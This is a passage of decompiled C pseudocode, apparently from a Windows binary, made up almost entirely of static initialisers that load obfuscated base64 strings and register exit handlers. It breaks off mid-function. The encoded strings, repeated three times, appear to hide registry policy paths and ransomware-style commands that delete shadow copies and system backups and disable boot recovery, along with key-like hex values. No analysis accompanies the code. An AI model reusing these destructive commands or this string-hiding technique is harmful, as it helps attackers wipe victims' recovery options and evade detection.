int dword_500B58; // weak
int dword_500B60[]; // weak
int dword_500B64; // weak
void *dword_500B68; // idb
_UNKNOWN unk_500B6C; // weak
__int64 qword_500C14; // weak
int dword_500C1C; // weak
int dword_500C20; // weak
int dword_500C24; // weak
int dword_500C28; // weak
int dword_500C2C; // weak
int dword_500C30; // weak
int dword_500C34; // weak
int dword_500C38; // weak
char byte_500C3C; // weak
LPSTR Destination; // idb
int dword_500C44[4]; // weak
char byte_500C54; // weak
void *dword_500C58; // idb
_UNKNOWN unk_500C5C; // weak
_UNKNOWN unk_500C60; // weak


//----- (00401000) --------------------------------------------------------
int sub_401000()
{
  sub_40A390(&Buf, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", 0x40u);
  return atexit(sub_486CC0);
}

//----- (00401020) --------------------------------------------------------
int sub_401020()
{
  sub_40A390(&dword_4F8D40, "Eg4HGRYEEwghECwiMy4yLic5IRYsLykuNjIhAjgzMygvORcoMzIsLi8hFS4xLCIsKDIhEjwyOSgw", 0x4Cu);
  return atexit(sub_486D20);
}

//----- (00401040) --------------------------------------------------------
int sub_401040()
{
  sub_40A390(&dword_4F8B78, "CC8kIzEoESwvKigpAi4vLygiOSwuLzI=", 0x20u);
  return atexit(sub_486D80);
}

//----- (00401060) --------------------------------------------------------
int sub_401060()
{
  sub_40A390(&dword_4F8AB8, "Ei4nOTYkMyghECwiMy4yLic5IRYsLykuNjIhAjgzMygvORcoMzIsLi8hEzgv", 0x3Cu);
  return atexit(sub_486DE0);
}

//----- (00401080) --------------------------------------------------------
int sub_401080()
{
  sub_40A390(&dword_4F8C38, "CC8kIzEoERgE", 0xCu);
  return atexit(sub_486E40);
}

//----- (004010A0) --------------------------------------------------------
int sub_4010A0()
{
  sub_40A390(&dword_4F8D88, "Ai4vMigvORUzLjA1OQMoLSQ3LC4zBCkwLC8=", 0x24u);
  return atexit(sub_486EA0);
}

//----- (004010C0) --------------------------------------------------------
int sub_4010C0()
{
  sub_40A390(&dword_4F8BC0, "EhwSGQgQCRMMFwg=", 0x10u);
  return atexit(sub_486F00);
}

//----- (004010E0) --------------------------------------------------------
int sub_4010E0()
{
  sub_40A390(&dword_4F8D70, "FRMOBhMEEAcMEQgSbT19d2w=", 0x18u);
  return atexit(sub_486F60);
}

//----- (00401100) --------------------------------------------------------
int sub_401100()
{
  sub_40A390(&dword_4F8BD8, "GBIIExUTDgcMEQg=", 0x10u);
  return atexit(sub_486FC0);
}

//----- (00401120) --------------------------------------------------------
int sub_401120()
{
  sub_40A390(&dword_4F8DE8, "FTMuJjMkMAkkOSQ=", 0x10u);
  return atexit(sub_487020);
}

//----- (00401140) --------------------------------------------------------
int sub_401140()
{
  sub_40A390(&dword_4F8D10, "FTMuJjMkMGUHLDEoMg==", 0x14u);
  return atexit(sub_487080);
}

//----- (00401160) --------------------------------------------------------
int sub_401160()
{
  sub_40A390(&dword_4F8E60, "BBERGBIIExIVEw4HDBEI", 0x14u);
  return atexit(sub_4870E0);
}

//----- (00401180) --------------------------------------------------------
int sub_401180()
{
  sub_40A390(&dword_4F8C98, "BDU1CSQ5JA==", 0xCu);
  return atexit(sub_487140);
}

//----- (004011A0) --------------------------------------------------------
int sub_4011A0()
{
  sub_40A390(&dword_4F8BF0, "FRgDEQwC", 8u);
  return atexit(sub_4871A0);
}

//----- (004011C0) --------------------------------------------------------
int sub_4011C0()
{
  sub_40A390(&dword_4F8C08, "GRAV", 4u);
  return atexit(sub_487200);
}

//----- (004011E0) --------------------------------------------------------
int sub_4011E0()
{
  sub_40A390(&dword_4F8AD0, "GS4zZQMzLjYyKDM=", 0x10u);
  return atexit(sub_487260);
}

//----- (00401200) --------------------------------------------------------
int sub_401200()
{
  sub_40A390(&dword_4F8C50, "FiwvKS42Mg==", 0xCu);
  return atexit(sub_4872C0);
}

//----- (00401220) --------------------------------------------------------
int sub_401220()
{
  sub_40A390(&dword_4F8CB0, "IRYsLykuNjI=", 0xCu);
  return atexit(sub_487320);
}

//----- (00401240) --------------------------------------------------------
int sub_401240()
{
  sub_40A390(&dword_4F8D28, "IRUzLiYzJDBlBywxKDI=", 0x14u);
  return atexit(sub_487380);
}

//----- (00401260) --------------------------------------------------------
int sub_401260()
{
  sub_40A390(&dword_4F8CF8, "IRgyKDMyIQQxMWUYMigzMg==", 0x18u);
  return atexit(sub_4873E0);
}

//----- (00401280) --------------------------------------------------------
int sub_401280()
{
  sub_40A390(&dword_4F8B60, "IQQ1NQkkOSQ=", 0xCu);
  return atexit(sub_487440);
}

//----- (004012A0) --------------------------------------------------------
int sub_4012A0()
{
  sub_40A390(&dword_4F8A28, "NjAsIm8oPShlEg0ECQ4WAg4VHGVuLy4sLzkoMyQiOSw3KA==", 0x30u);
  return atexit(sub_4874A0);
}

//----- (004012C0) --------------------------------------------------------
int sub_4012C0()
{
  sub_40A390(&dword_4F8A88, "NiMkKTAsL2UJCBEIGQhlEhwSGQgQEhkEGQgDBAIKGBU=", 0x2Cu);
  return atexit(sub_487500);
}

//----- (004012E0) --------------------------------------------------------
int sub_4012E0()
{
  sub_40A390(&dword_4F8E30, "NiMkKTAsL2UJCBEIGQhlEhwSGQgQEhkEGQgDBAIKGBVlcCkoMSg5KA4xKSgyOQ==", 0x40u);
  return atexit(sub_487560);
}

//----- (00401300) --------------------------------------------------------
int sub_401300()
{
  sub_40A390(&dword_4F8E18, "IyIpKCksOW8oPShlbjIoOWU6KSgnJDgxOUBlMygiLjcoMzwoLyQjMSgpZQ8u", 0x3Cu);
  return atexit(sub_4875C0);
}

//----- (00401320) --------------------------------------------------------
int sub_401320()
{
  sub_40A390(
    &dword_4F8A58,
    "IyIpKCksOW8oPShlbjIoOWU6KSgnJDgxOUBlIy4uOTI5JDk4MjUuMSwiPGUsJi8uMygkMTEnJCwxODMoMg==",
    0x54u);
  return atexit(sub_487620);
}

//----- (00401340) --------------------------------------------------------
int sub_401340()
{
  sub_40A390(&dword_4F8C20, "NzIyJCkwLC9vKD0oZQkoMSg5KGUSLSQpLjYyZW4EMTFlbhQ4LCg5", 0x34u);
  return atexit(sub_487680);
}

//----- (00401360) --------------------------------------------------------
int sub_401360()
{
  sub_40A390(&dword_4F8A40, "CDEoNyQ5LC4vewQpMCwvLDI5MyQ5LjNkLyg2ew==", 0x28u);
  return atexit(sub_4876E0);
}

//----- (00401380) --------------------------------------------------------
int sub_401380()
{
  sub_40A390(&dword_4F8DB8, "OnIIeAcCdgd8cHwEeHRweXJ3dnB8dXdycAR0c3VzeXkHAwgCdkA=", 0x34u);
  return atexit(sub_487740);
}

//----- (004013A0) --------------------------------------------------------
int sub_4013A0()
{
  sub_40A390(&dword_4F8AA0, "OncICQl3CXZ5cAJ1dXZweQh2eHADdncEcAh4dnl1fHx4CHN5AkA=", 0x34u);
  return atexit(sub_4877A0);
}

//----- (004013C0) --------------------------------------------------------
int sub_4013C0()
{
  sub_40A390(&dword_4F8B18, "NS42KDMyLSgxMW8oPSg=", 0x14u);
  return atexit(sub_487800);
}

//----- (004013E0) --------------------------------------------------------
int sub_4013E0()
{
  sub_40A390(&dword_4F8B48, "cDMoJCkwKG8tOTAx", 0x10u);
  return atexit(sub_487860);
}

//----- (00401400) --------------------------------------------------------
int sub_401400()
{
  sub_40A390(&dword_4F8AE8, "IyIqJjMpbyMwNQ==", 0x10u);
  return atexit(sub_4878C0);
}

//----- (00401420) --------------------------------------------------------
int sub_401420()
{
  sub_40A390(&dword_4F8E48, "BDExZTwuODNlJywxKDJlLSQyZSMoKC9lKC8iMzw1OSgpS0sMLzI5MzgiOSwuL2U=", 0x40u);
  return atexit(sub_487920);
}

//----- (00401440) --------------------------------------------------------
int sub_401440()
{
  sub_40A390(&dword_4F8B30, "DQ4QCAkTDBcI", 0xCu);
  return atexit(sub_487980);
}

//----- (00401460) --------------------------------------------------------
int sub_401460()
{
  sub_40A390(&dword_4F8B00, "DQ4QCBUEGQ0=", 0xCu);
  return atexit(sub_4879E0);
}

//----- (00401480) --------------------------------------------------------
int sub_401480()
{
  sub_40A390(&dword_4F8A10, "Ai4vOTMuMWUVJC8oMSEJKDIqOS41", 0x1Cu);
  return atexit(sub_487A40);
}

//----- (004014A0) --------------------------------------------------------
int sub_4014A0()
{
  sub_40A390(&dword_4F8E78, "FiQxMRUkNSgz", 0xCu);
  return atexit(sub_487AA0);
}

//----- (004014C0) --------------------------------------------------------
int sub_4014C0()
{
  sub_40A390(&dword_4F8CE0, "OjosKUBA", 8u);
  return atexit(sub_487B00);
}

//----- (004014E0) --------------------------------------------------------
int sub_4014E0()
{
  sub_40A390(&dword_4F8DD0, "ODUpJDko", 8u);
  return atexit(sub_487B60);
}

//----- (00401500) --------------------------------------------------------
int sub_401500()
{
  sub_40A390(&dword_4F8C68, "OnMEdQh8AnYDcHcDCH1weXJ1d3B8B3ZycHR1eHZ1dXIHd3V4A0A=", 0x34u);
  return atexit(sub_487BC0);
}

//----- (00401520) --------------------------------------------------------
int sub_401520()
{
  sub_40A390(&dword_4F8D58, "IRUzLiYzJDBlBywxKDIhECwiMy4yLic5IQg9Ii0kLyYoZRIoMzcoMw==", 0x38u);
  return atexit(sub_487C20);
}

//----- (00401540) --------------------------------------------------------
int sub_401540()
{
  sub_40A390(&dword_4F8B90, "IRUzLiYzJDBlBywxKDJlbT19d2whECwiMy4yLic5IQg9Ii0kLyYoZRIoMzcoMw==", 0x40u);
  return atexit(sub_487C80);
}

//----- (00401560) --------------------------------------------------------
int sub_401560()
{
  sub_40A390(&dword_4F8BA8, "IRUzLiYzJDBlBywxKDIhECwiMy4yLic5ZRIUEWUSKDM3KDM=", 0x30u);
  return atexit(sub_487CE0);
}

//----- (00401580) --------------------------------------------------------
int sub_401580()
{
  sub_40A390(&dword_4F8E00, "IRUzLiYzJDBlBywxKDJlbT19d2whECwiMy4yLic5ZRIUEWUSKDM3KDM=", 0x38u);
  return atexit(sub_487D40);
}

//----- (004015A0) --------------------------------------------------------
int sub_4015A0()
{
  sub_40A390(&dword_4F8DA0, "FiwvDC8oOQ==", 0xCu);
  return atexit(sub_487DA0);
}

//----- (004015C0) --------------------------------------------------------
int sub_4015C0()
{
  sub_40A390(&dword_4F8A70, "DRkZFW50b3Q=", 0xCu);
  return atexit(sub_487E00);
}

//----- (004015E0) --------------------------------------------------------
int sub_4015E0()
{
  sub_40A390(&dword_4F8CC8, "BggZ", 4u);
  return atexit(sub_487E60);
}

//----- (00401600) --------------------------------------------------------
int sub_401600()
{
  sub_40A390(&dword_4F8C80, "JDUsbzA8LDVvIi4w", 0x10u);
  return atexit(sub_487EC0);
}

//----- (00401620) --------------------------------------------------------
int sub_401620()
{
  sub_40A390(&dword_4F8E90, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", 0x40u);
  return atexit(sub_487F20);
}

//----- (00401640) --------------------------------------------------------
int sub_401640()
{
  sub_40A390(&dword_4F91D8, "Eg4HGRYEEwghECwiMy4yLic5IRYsLykuNjIhAjgzMygvORcoMzIsLi8hFS4xLCIsKDIhEjwyOSgw", 0x4Cu);
  return atexit(sub_487F80);
}

//----- (00401660) --------------------------------------------------------
int sub_401660()
{
  sub_40A390(&dword_4F9010, "CC8kIzEoESwvKigpAi4vLygiOSwuLzI=", 0x20u);
  return atexit(sub_487FE0);
}

//----- (00401680) --------------------------------------------------------
int sub_401680()
{
  sub_40A390(&dword_4F8F50, "Ei4nOTYkMyghECwiMy4yLic5IRYsLykuNjIhAjgzMygvORcoMzIsLi8hEzgv", 0x3Cu);
  return atexit(sub_488040);
}

//----- (004016A0) --------------------------------------------------------
int sub_4016A0()
{
  sub_40A390(&dword_4F90D0, "CC8kIzEoERgE", 0xCu);
  return atexit(sub_4880A0);
}

//----- (004016C0) --------------------------------------------------------
int sub_4016C0()
{
  sub_40A390(&dword_4F9220, "Ai4vMigvORUzLjA1OQMoLSQ3LC4zBCkwLC8=", 0x24u);
  return atexit(sub_488100);
}

//----- (004016E0) --------------------------------------------------------
int sub_4016E0()
{
  sub_40A390(&dword_4F9058, "EhwSGQgQCRMMFwg=", 0x10u);
  return atexit(sub_488160);
}

//----- (00401700) --------------------------------------------------------
int sub_401700()
{
  sub_40A390(&dword_4F9208, "FRMOBhMEEAcMEQgSbT19d2w=", 0x18u);
  return atexit(sub_4881C0);
}

//----- (00401720) --------------------------------------------------------
int sub_401720()
{
  sub_40A390(&dword_4F9070, "GBIIExUTDgcMEQg=", 0x10u);
  return atexit(sub_488220);
}

//----- (00401740) --------------------------------------------------------
int sub_401740()
{
  sub_40A390(&dword_4F9280, "FTMuJjMkMAkkOSQ=", 0x10u);
  return atexit(sub_488280);
}

//----- (00401760) --------------------------------------------------------
int sub_401760()
{
  sub_40A390(&dword_4F91A8, "FTMuJjMkMGUHLDEoMg==", 0x14u);
  return atexit(sub_4882E0);
}

//----- (00401780) --------------------------------------------------------
int sub_401780()
{
  sub_40A390(&dword_4F92F8, "BBERGBIIExIVEw4HDBEI", 0x14u);
  return atexit(sub_488340);
}

//----- (004017A0) --------------------------------------------------------
int sub_4017A0()
{
  sub_40A390(&dword_4F9130, "BDU1CSQ5JA==", 0xCu);
  return atexit(sub_4883A0);
}

//----- (004017C0) --------------------------------------------------------
int sub_4017C0()
{
  sub_40A390(&dword_4F9088, "FRgDEQwC", 8u);
  return atexit(sub_488400);
}

//----- (004017E0) --------------------------------------------------------
int sub_4017E0()
{
  sub_40A390(&dword_4F90A0, "GRAV", 4u);
  return atexit(sub_488460);
}

//----- (00401800) --------------------------------------------------------
int sub_401800()
{
  sub_40A390(&dword_4F8F68, "GS4zZQMzLjYyKDM=", 0x10u);
  return atexit(sub_4884C0);
}

//----- (00401820) --------------------------------------------------------
int sub_401820()
{
  sub_40A390(&dword_4F90E8, "FiwvKS42Mg==", 0xCu);
  return atexit(sub_488520);
}

//----- (00401840) --------------------------------------------------------
int sub_401840()
{
  sub_40A390(&dword_4F9148, "IRYsLykuNjI=", 0xCu);
  return atexit(sub_488580);
}

//----- (00401860) --------------------------------------------------------
int sub_401860()
{
  sub_40A390(&dword_4F91C0, "IRUzLiYzJDBlBywxKDI=", 0x14u);
  return atexit(sub_4885E0);
}

//----- (00401880) --------------------------------------------------------
int sub_401880()
{
  sub_40A390(&dword_4F9190, "IRgyKDMyIQQxMWUYMigzMg==", 0x18u);
  return atexit(sub_488640);
}

//----- (004018A0) --------------------------------------------------------
int sub_4018A0()
{
  sub_40A390(&dword_4F8FF8, "IQQ1NQkkOSQ=", 0xCu);
  return atexit(sub_4886A0);
}

//----- (004018C0) --------------------------------------------------------
int sub_4018C0()
{
  sub_40A390(&dword_4F8EC0, "NjAsIm8oPShlEg0ECQ4WAg4VHGVuLy4sLzkoMyQiOSw3KA==", 0x30u);
  return atexit(sub_488700);
}

//----- (004018E0) --------------------------------------------------------
int sub_4018E0()
{
  sub_40A390(&dword_4F8F20, "NiMkKTAsL2UJCBEIGQhlEhwSGQgQEhkEGQgDBAIKGBU=", 0x2Cu);
  return atexit(sub_488760);
}

//----- (00401900) --------------------------------------------------------
int sub_401900()
{
  sub_40A390(&dword_4F92C8, "NiMkKTAsL2UJCBEIGQhlEhwSGQgQEhkEGQgDBAIKGBVlcCkoMSg5KA4xKSgyOQ==", 0x40u);
  return atexit(sub_4887C0);
}

//----- (00401920) --------------------------------------------------------
int sub_401920()
{
  sub_40A390(&dword_4F92B0, "IyIpKCksOW8oPShlbjIoOWU6KSgnJDgxOUBlMygiLjcoMzwoLyQjMSgpZQ8u", 0x3Cu);
  return atexit(sub_488820);
}

//----- (00401940) --------------------------------------------------------
int sub_401940()
{
  sub_40A390(
    &dword_4F8EF0,
    "IyIpKCksOW8oPShlbjIoOWU6KSgnJDgxOUBlIy4uOTI5JDk4MjUuMSwiPGUsJi8uMygkMTEnJCwxODMoMg==",
    0x54u);
  return atexit(sub_488880);
}

//----- (00401960) --------------------------------------------------------
int sub_401960()
{
  sub_40A390(&dword_4F90B8, "NzIyJCkwLC9vKD0oZQkoMSg5KGUSLSQpLjYyZW4EMTFlbhQ4LCg5", 0x34u);
  return atexit(sub_4888E0);
}

//----- (00401980) --------------------------------------------------------
int sub_401980()
{
  sub_40A390(&dword_4F8ED8, "CDEoNyQ5LC4vewQpMCwvLDI5MyQ5LjNkLyg2ew==", 0x28u);
  return atexit(sub_488940);
}

//----- (004019A0) --------------------------------------------------------
int sub_4019A0()
{
  sub_40A390(&dword_4F9250, "OnIIeAcCdgd8cHwEeHRweXJ3dnB8dXdycAR0c3VzeXkHAwgCdkA=", 0x34u);
  return atexit(sub_4889A0);
}

//----- (004019C0) --------------------------------------------------------
int sub_4019C0()
{
  sub_40A390(&dword_4F8F38, "OncICQl3CXZ5cAJ1dXZweQh2eHADdncEcAh4dnl1fHx4CHN5AkA=", 0x34u);
  return atexit(sub_488A00);
}

//----- (004019E0) --------------------------------------------------------
int sub_4019E0()
{
  sub_40A390(&dword_4F8FB0, "NS42KDMyLSgxMW8oPSg=", 0x14u);
  return atexit(sub_488A60);
}

//----- (00401A00) --------------------------------------------------------
int sub_401A00()
{
  sub_40A390(&dword_4F8FE0, "cDMoJCkwKG8tOTAx", 0x10u);
  return atexit(sub_488AC0);
}

//----- (00401A20) --------------------------------------------------------
int sub_401A20()
{
  sub_40A390(&dword_4F8F80, "IyIqJjMpbyMwNQ==", 0x10u);
  return atexit(sub_488B20);
}

//----- (00401A40) --------------------------------------------------------
int sub_401A40()
{
  sub_40A390(&dword_4F92E0, "BDExZTwuODNlJywxKDJlLSQyZSMoKC9lKC8iMzw1OSgpS0sMLzI5MzgiOSwuL2U=", 0x40u);
  return atexit(sub_488B80);
}

//----- (00401A60) --------------------------------------------------------
int sub_401A60()
{
  sub_40A390(&dword_4F8FC8, "DQ4QCAkTDBcI", 0xCu);
  return atexit(sub_488BE0);
}

//----- (00401A80) --------------------------------------------------------
int sub_401A80()
{
  sub_40A390(&dword_4F8F98, "DQ4QCBUEGQ0=", 0xCu);
  return atexit(sub_488C40);
}

//----- (00401AA0) --------------------------------------------------------
int sub_401AA0()
{
  sub_40A390(&dword_4F8EA8, "Ai4vOTMuMWUVJC8oMSEJKDIqOS41", 0x1Cu);
  return atexit(sub_488CA0);
}

//----- (00401AC0) --------------------------------------------------------
int sub_401AC0()
{
  sub_40A390(&dword_4F9310, "FiQxMRUkNSgz", 0xCu);
  return atexit(sub_488D00);
}

//----- (00401AE0) --------------------------------------------------------
int sub_401AE0()
{
  sub_40A390(&dword_4F9178, "OjosKUBA", 8u);
  return atexit(sub_488D60);
}

//----- (00401B00) --------------------------------------------------------
int sub_401B00()
{
  sub_40A390(&dword_4F9268, "ODUpJDko", 8u);
  return atexit(sub_488DC0);
}

//----- (00401B20) --------------------------------------------------------
int sub_401B20()
{
  sub_40A390(&dword_4F9100, "OnMEdQh8AnYDcHcDCH1weXJ1d3B8B3ZycHR1eHZ1dXIHd3V4A0A=", 0x34u);
  return atexit(sub_488E20);
}

//----- (00401B40) --------------------------------------------------------
int sub_401B40()
{
  sub_40A390(&dword_4F91F0, "IRUzLiYzJDBlBywxKDIhECwiMy4yLic5IQg9Ii0kLyYoZRIoMzcoMw==", 0x38u);
  return atexit(sub_488E80);
}

//----- (00401B60) --------------------------------------------------------
int sub_401B60()
{
  sub_40A390(&dword_4F9028, "IRUzLiYzJDBlBywxKDJlbT19d2whECwiMy4yLic5IQg9Ii0kLyYoZRIoMzcoMw==", 0x40u);
  return atexit(sub_488EE0);
}

//----- (00401B80) --------------------------------------------------------
int sub_401B80()
{
  sub_40A390(&dword_4F9040, "IRUzLiYzJDBlBywxKDIhECwiMy4yLic5ZRIUEWUSKDM3KDM=", 0x30u);
  return atexit(sub_488F40);
}

//----- (00401BA0) --------------------------------------------------------
int sub_401BA0()
{
  sub_40A390(&dword_4F9298, "IRUzLiYzJDBlBywxKDJlbT19d2whECwiMy4yLic5ZRIUEWUSKDM3KDM=", 0x38u);
  return atexit(sub_488FA0);
}

//----- (00401BC0) --------------------------------------------------------
int sub_401BC0()
{
  sub_40A390(&dword_4F9238, "FiwvDC8oOQ==", 0xCu);
  return atexit(sub_489000);
}

//----- (00401BE0) --------------------------------------------------------
int sub_401BE0()
{
  sub_40A390(&dword_4F8F08, "DRkZFW50b3Q=", 0xCu);
  return atexit(sub_489060);
}

//----- (00401C00) --------------------------------------------------------
int sub_401C00()
{
  sub_40A390(&dword_4F9160, "BggZ", 4u);
  return atexit(sub_4890C0);
}

//----- (00401C20) --------------------------------------------------------
int sub_401C20()
{
  sub_40A390(&dword_4F9118, "JDUsbzA8LDVvIi4w", 0x10u);
  return atexit(sub_489120);
}

//----- (00401C40) --------------------------------------------------------
int sub_401C40()
{
  sub_40A390(&dword_4F9328, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", 0x40u);
  return atexit(sub_489180);
}

//----- (00401C60) --------------------------------------------------------
int sub_401C60()
{
  sub_40A390(&dword_4F9670, "Eg4HGRYEEwghECwiMy4yLic5IRYsLykuNjIhAjgzMygvORcoMzIsLi8hFS4xLCIsKDIhEjwyOSgw", 0x4Cu);
  return atexit(sub_4891E0);
}

//----- (00401C80) --------------------------------------------------------
int sub_401C80()
{
  sub_40A390(&dword_4F94A8, "CC8kIzEoESwvKigpAi4vLygiOSwuLzI=", 0x20u);
  return atexit(sub_489240);
}

//----- (00401CA0) --------------------------------------------------------
int sub_401CA0()
{
  sub_40A390(&dword_4F93E8, "Ei4nOTYkMyghECwiMy4yLic5IRYsLykuNjIhAjgzMygvORcoMzIsLi8hEzgv", 0x3Cu);
  return atexit(sub_4892A0);
}

//----- (00401CC0) --------------------------------------------------------
int sub_401CC0()
{
  sub_40A390(&dword_4F9568, "CC8kIzEoERgE", 0xCu);
  return atexit(sub_489300);
}

//----- (00401CE0) --------------------------------------------------------
int sub_401CE0()
{
  sub_40A390(&dword_4F96B8, "Ai4vMigvORUzLjA1OQMoLSQ3LC4zBCkwLC8=", 0x24u);
  return atexit(sub_489360);
}

//----- (00401D00) --------------------------------------------------------
int sub_401D00()
{
  sub_40A390(&dword_4F94F0, "EhwSGQgQCRMMFwg=", 0x10u);
  return atexit(sub_4893C0);
}

//----- (00401D20) --------------------------------------------------------
int sub_401D20()
{
  sub_40A390(&dword_4F96A0, "FRMOBhMEEAcMEQgSbT19d2w=", 0x18u);
  return atexit(sub_489420);
}

//----- (00401D40) --------------------------------------------------------
int sub_401D40()
{
  sub_40A390(&dword_4F9508, "GBIIExUTDgcMEQg=", 0x10u);
  return atexit(sub_489480);
}

//----- (00401D60) --------------------------------------------------------
int sub_401D60()
{
  sub_40A390(&dword_4F9718, "FTMuJjMkMAkkOSQ=", 0x10u);
  return atexit(sub_4894E0);
}

//----- (00401D80) --------------------------------------------------------
int sub_401D80()
{
  sub_40A390(&dword_4F9640, "FTMuJjMkMGUHLDEoMg==", 0x14u);
  return atexit(sub_489540);
}

//----- (00401DA0) --------------------------------------------------------
int sub_401DA0()
{
  sub_40A390(&dword_4F9790, "BBERGBIIExIVEw4HDBEI", 0x14u);
  return atexit(sub_4895A0);
}

//----- (00401DC0) --------------------------------------------------------
int sub_401DC0()
{
  sub_40A390(&dword_4F95C8, "BDU1CSQ5JA==", 0xCu);
  return atexit(sub_489600);
}

//----- (00401DE0) --------------------------------------------------------
int sub_401DE0()
{
  sub_40A390(&dword_4F9520, "FRgDEQwC", 8u);
  return atexit(sub_489660);
}

//----- (00401E00) --------------------------------------------------------
int sub_401E00()
{
  sub_40A390(&dword_4F9538, "GRAV", 4u);
  return atexit(sub_4896C0);
}

//----- (00401E20) --------------------------------------------------------
int sub_401E20()
{
  sub_40A390(&dword_4F9400, "GS4zZQMzLjYyKDM=", 0x10u);
  return atexit(sub_489720);
}

//----- (00401E40) --------------------------------------------------------
int sub_401E40()
{
  sub_40A390(&dword_4F9580, "FiwvKS42Mg==", 0xCu);
  return atexit(sub_489780);
}

//----- (00401E60) --------------------------------------------------------
int sub_401E60()
{
  sub_40A390(&dword_4F95E0, "IRYsLykuNjI=", 0xCu);
  return atexit(sub_4897E0);
}

//----- (00401E80) --------------------------------------------------------
int sub_401E80()
{
  sub_40A390(&dword_4F9658, "IRUzLiYzJDBlBywxKDI=", 0x14u);
  return atexit(sub_489840);
}

//----- (00401EA0) --------------------------------------------------------
int sub_401EA0()
{
  sub_40A390(&dword_4F9628, "IRgyKDMyIQQxMWUYMigzMg==", 0x18u);
  return atexit(sub_4898A0);
}

//----- (00401EC0) --------------------------------------------------------
int sub_401EC0()
{
  sub_40A390(&dword_4F9490, "IQQ1NQkkOSQ=", 0xCu);
  return atexit(sub_489900);
}

//----- (00401EE0) --------------------------------------------------------
int sub_401EE0()
{
  sub_40A390(&dword_4F9358, "NjAsIm8oPShlEg0ECQ4WAg4VHGVuLy4sLzkoMyQiOSw3KA==", 0x30u);
  return atexit(sub_489960);
}

//----- (00401F00) --------------------------------------------------------
int sub_401F00()
{
  sub_40A390(&dword_4F93B8, "NiMkKTAsL2UJCBEIGQhlEhwSGQgQEhkEGQgDBAIKGBU=", 0x2Cu);
  return atexit(sub_4899C0);
}

//----- (00401F20) --------------------------------------------------------
int sub_401F20()
{
  sub_40A390(&dword_4F9760, "NiMkKTAsL2UJCBEIGQhlEhwSGQgQEhkEGQgDBAIKGBVlcCkoMSg5KA4xKSgyOQ==", 0x40u);
  return atexit(sub_489A20);
}

//----- (00401F40) --------------------------------------------------------
int sub_401F40()
{
  sub_40A390(&dword_4F9748, "IyIpKCksOW8oPShlbjIoOWU6KSgnJDgxOUBlMygiLjcoMzwoLyQjMSgpZQ8u", 0x3Cu);
  return atexit(sub_489A80);
}

//----- (00401F60) --------------------------------------------------------
int sub_401F60()
{
  sub_40A390(
    &dword_4F9388,
    "IyIpKCksOW8oPShlbjIoOWU6KSgnJDgxOUBlIy4uOTI5JDk4MjUuMSwiPGUsJi8uMygkMTEnJCwxODMoMg==",
    0x54u);
  return atexit(sub_489AE0);
}

//----- (00401F80) --------------------------------------------------------
int sub_401F80()
{
  sub_40A390(&dword_4F9550, "NzIyJCkwLC9vKD0oZQkoMSg5KGUSLSQpLjYyZW4EMTFlbhQ4LCg5", 0x34u);
  return atexit(sub_489B40);
}

//----- (00401FA0) --------------------------------------------------------
int sub_401FA0()
{
  sub_40A390(&dword_4F9370, "CDEoNyQ5LC4vewQpMCwvLDI5MyQ5LjNkLyg2ew==", 0x28u);
  return atexit(sub_489BA0);
}

//----- (00401FC0) --------------------------------------------------------
int sub_401FC0()
{
  sub_40A390(&dword_4F96E8, "OnIIeAcCdgd8cHwEeHRweXJ3dnB8dXdycAR0c3VzeXkHAwgCdkA=", 0x34u);
  return atexit(sub_489C00);
}

//----- (00401FE0) --------------------------------------------------------
int sub_401FE0()
{
  sub_40A390(&dword_4F93D0, "OncICQl3CXZ5cAJ1dXZweQh2eHADdncEcAh4dnl1fHx4CHN5AkA=", 0x34u);
  return atexit(sub_489C60);
}

//----- (00402000) --------------------------------------------------------
int sub_402000()
{
  sub_40A390(&dword_4F9448, "NS42KDMyLSgxMW8oPSg=", 0x14u);
  return atexit(sub_489CC0);
}

//----- (00402020) --------------------------------------------------------
int sub_402020()
{
  sub_40A390(&dword_4F9478, "cDMoJCkwKG8tOTAx", 0x10u);
  return atexit(sub_489D20);
}

//----- (00402040) --------------------------------------------------------
int sub_402040()
{
  sub_40A390(&dword_4F9418, "IyIqJjMpbyMwNQ==", 0x10u);
  return atexit(sub_489D80);
}

//----- (00402060) --------------------------------------------------------
int sub_402060()
{
  sub_40A390(&dword_4F9778, "BDExZTwuODNlJywxKDJlLSQyZSMoKC9lKC8iMzw1OSgpS0sMLzI5MzgiOSwuL2U=", 0x40u);
  return atexit(sub_489DE0);
}

//----- (00402080) --------------------------------------------------------
int sub_402080()
{
  sub_40A390(&dword_4F9460, "DQ4QCAkTDBcI", 0xCu);
  return atexit(sub_489E40);
}

//----- (004020A0) --------------------------------------------------------
int sub_4020A0()
{
  sub_40A390(&dword_4F9430, "DQ4QCBUEGQ0=", 0xCu);
  return atexit(sub_489EA0);
}

//----- (004020C0) --------------------------------------------------------
int sub_4020C0()
{
  sub_40A390(&dword_4F9340, "Ai4vOTMuMWUVJC8oMSEJKDIqOS41", 0x1Cu);
  return atexit(sub_489F00);
}

//----- (004020E0) --------------------------------------------------------
int sub_4020E0()
{
  sub_40A390(&dword_4F97A8, "FiQxMRUkNSgz", 0xCu);
  return atexit(sub_489F60);
}

//----- (00402100) --------------------------------------------------------
int sub_402100()
{
  sub_40A390(&dword_4F9610, "OjosKUBA", 8u);
  return atexit(sub_489FC0);
}

//----- (00402120) --------------------------------------------------------
int sub_402120()
{
  sub_40A390(&dword_4F9700, "ODUpJDko", 8u);
  return atexit(sub_48A020);
}

//----- (00402140) --------------------------------------------------------
int sub_402140()
{
  sub_40A390(&dword_4F9598, "OnMEdQh8AnYDcHcDCH1weXJ1d3B8B3ZycHR1eHZ1dXIHd3V4A0A=", 0x34u);
  return atexit(sub_48A080);
}

//----- (00402160) --------------------------------------------------------
int sub_402160()
{
  sub_40A390(&dword_4F9688, "IRUzLiYzJDBlBywxKDIhECwiMy4yLic5IQg9Ii0kLyYoZRIoMzcoMw==", 0x38u);
  return atexit(sub_48A0E0);
}

//----- (00402180) --------------------------------------------------------
int sub_402180()
{
  sub_40A390(&dword_4F94C0, "IRUzLiYzJDBlBywxKDJlbT19d2whECwiMy4yLic5IQg9Ii0kLyYoZRIoMzcoMw==", 0x40u);
  return atexit(sub_48A140);
}

//----- (004021A0) --------------------------------------------------------
int sub_4021A0()
{
